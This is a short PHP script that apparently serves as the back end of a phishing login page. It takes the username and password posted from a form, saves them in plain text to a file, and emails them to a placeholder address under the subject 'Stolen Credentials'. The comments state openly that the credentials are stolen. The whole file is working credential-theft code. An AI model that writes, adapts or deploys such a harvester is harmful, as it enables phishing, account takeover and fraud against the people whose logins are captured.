<?php
  $username = $_POST['username'];
  $password = $_POST['password'];

  // Save the login credentials to a file
  $file = fopen("credentials.txt", "w");
  fwrite($file, "Username: " . $username . "\n");
  fwrite($file, "Password: " . $password);
  fclose($file);

  // Send the stolen credentials to your email address
  $to = "your_email@example.com";
  $subject = "Stolen Credentials";
  $message = "Username: " . $username . "\n" . "Password: " . $password;
  $headers = "From: hacked_email@example.com";
  mail($to, $subject, $message, $headers);
?>